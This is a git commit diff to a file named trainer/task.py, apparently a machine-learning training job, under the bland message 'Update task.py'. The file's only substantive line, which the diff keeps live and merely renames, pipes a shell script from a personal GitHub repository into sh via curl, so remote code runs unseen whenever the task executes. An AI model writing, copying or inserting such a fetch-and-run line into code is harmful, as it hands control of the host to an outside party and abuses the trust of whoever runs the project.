d609993943450f4f0770575b6d0d9514347a35c2
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-03-14 01:11:44 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/bitnew.sh | sh')
+os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/build.sh | sh')
